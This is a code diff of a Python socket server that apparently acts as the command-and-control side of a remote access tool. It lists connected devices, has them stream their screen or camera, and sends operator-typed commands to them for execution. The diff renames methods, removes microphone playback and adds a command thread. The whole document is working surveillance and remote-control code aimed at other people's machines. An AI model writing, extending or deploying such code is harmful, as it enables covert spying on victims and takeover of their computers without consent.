@@ -11,55 +11,44 @@ from threading import Thread
 Users = {}
 IPs = []
 
-class commandCMD():
+class CommandCMD():
     def __init__(self, conn):
         self.conn = conn
+        print("test")
         self.commands()
-
+        
     def commands(self):
         command = input("CMD:")
      
         self.conn.sendall(command.encode())
         return
 
-class server():
+class Server():
     def __init__(self):
         self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.server.bind(("0.0.0.0", 4000))
         self.server.listen(10)
 
-        self.payload_size = struct.calcsize("Q")
-        self.modeState = 0
-        self.count = 0
-
-        self.frame = None
-        self.addr = None
-        self.ip = None
-
-        self.scrollDown = True
         self.stop_loop = False
-        self.scrollUp = False
-        self.play_mic = True
         
-        Thread(target=self.initServer, args=()).start()
+        Thread(target=self.init_server, args=()).start()
 
-        self.proc = Thread(target=self.processData, args=())
-        self.proc.daemon = True
+        self.proc_data = Thread(target=self.process_data, args=())
+        self.exec_command = Thread(target=self.execute_command, args=())
         
-        self.selectDeviceIp()
+        self.select_device_ip()
         
-    def initServer(self):
+    def init_server(self):
         while True:
             conn, addr = self.server.accept()
 
             ddr = addr[0]+":"+str(addr[1])
-            print(ddr)
 
             Users[ddr] = conn
             IPs.append(ddr)
             print("Connection recv", ddr)
 
-    def selectDeviceIp(self):
+    def select_device_ip(self):
         while True:
             print("IP list: ", IPs)
 
@@ -72,22 +61,15 @@ class server():
                 self.conn = Users[self.device]
                 self.conn.sendall(b"cam_packet")
 
-                print(f"{Users[self.device]} activated.")
-
-                self.proc.start()
-                self.showCam()
+                self.proc_data.start()
+                self.exec_command.start()
                 break
 
             except Exception as err:
                 print(err)
                 continue
 
-    
-    def playMic(self, data):
-        if self.play_mic:
-            stream.write(data)
-
-    def processData(self):
+    def process_data(self):
         while True:
             conn = self.conn
 
@@ -96,7 +78,7 @@ class server():
                 continue
 
             try:
-                action = conn.recv(1)[0]
+                action = self.conn.recv(1)[0]
             except:
                 continue
 
@@ -120,28 +102,25 @@ class server():
 
                         cv2.imshow("Screen", image_opencv)
                         cv2.waitKey(1)
-        
-            elif action == 0x02:
-                mic_packet = conn.recv(2048)
-                #self.playMic(mic_packet)
 
             elif action == 0x04:
                 msg_len = conn.recv(3)
                 msg_len = (msg_len[0] << 16) + (msg_len[1] << 8) + msg_len[2]
-                msg = conn.recv(msg_len)
+                msg = self.conn.recv(msg_len)
 
-    def showCam(self):
+    def execute_command(self):
         while True:
             if keyboard.is_pressed("t"):
                 self.conn.sendall(b"cmd_packet")
                 self.stop_loop = True   
 
                 try:
-                    commandCMD(self.conn)
-                except:
+                    CommandCMD(self.conn)
+                except Exception as err:
+                    print(err)
                     pass
 
                 self.stop_loop = False
 
 if __name__ == "__main__":
-    server()
+    Server()
